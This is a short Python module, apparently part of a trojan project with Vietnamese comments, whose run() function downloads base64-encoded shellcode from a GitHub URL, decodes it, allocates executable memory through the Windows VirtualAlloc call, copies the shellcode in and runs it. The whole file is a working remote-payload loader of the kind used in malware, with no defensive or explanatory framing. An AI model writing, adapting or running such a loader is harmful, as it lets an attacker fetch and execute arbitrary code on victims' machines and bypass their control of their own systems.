import ctypes
import base64
import urllib.request

def run(**args):
    try:
        # 🛰️ Tải shellcode base64 từ GitHub (đặt đúng đường dẫn của bạn tại đây)
        url = "https://github.com/leducymta/bhptrojan/blob/master/shellcode/shellcode.b64"
        encoded_shellcode = urllib.request.urlopen(url).read()

        # 🧩 Giải mã base64
        shellcode = base64.b64decode(encoded_shellcode)
        size = len(shellcode)

        # 🧠 Cấp phát bộ nhớ có quyền thực thi
        kernel32 = ctypes.windll.kernel32
        ptr = kernel32.VirtualAlloc(
            None,
            size,
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40     # PAGE_EXECUTE_READWRITE
        )

        if not ptr:
            return "[!] Failed to allocate memory."

        # 🧪 Copy shellcode vào vùng nhớ đó
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_void_p(ptr),
            shellcode,
            size
        )

        # 🔥 Gọi shellcode như một hàm
        shell_func = ctypes.CFUNCTYPE(None)(ptr)
        shell_func()

        return "[✓] Shellcode executed successfully"

    except Exception as e:
        return f"[!] Shellcode execution failed: {str(e)}"

